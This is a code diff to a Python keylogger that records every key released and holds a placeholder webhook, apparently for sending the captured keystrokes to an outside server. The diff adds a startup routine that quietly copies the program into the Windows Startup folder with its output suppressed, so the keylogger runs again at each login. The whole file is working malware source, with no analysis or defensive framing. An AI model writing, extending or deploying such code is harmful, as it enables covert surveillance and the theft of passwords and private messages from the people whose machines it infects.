@@ -1,8 +1,17 @@
 import keyboard
 import requests
+import threading
+import subprocess
+import sys
+import os
 
 WEBHOOK = "PASTE YOUR WEBHOOK HERE!"
 LOG = []
+
+def startup():
+    subprocess.run(f'copy "{sys.executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
+                   shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 
 def on_key_release(key):
     global LOG
@@ -20,7 +29,7 @@ def on_key_release(key):
     else:
         LOG.append(f"`{key.name}`")
 
+threading.Thread(target=startup).start()
 
 keyboard.on_release(on_key_release)
-
 keyboard.wait()
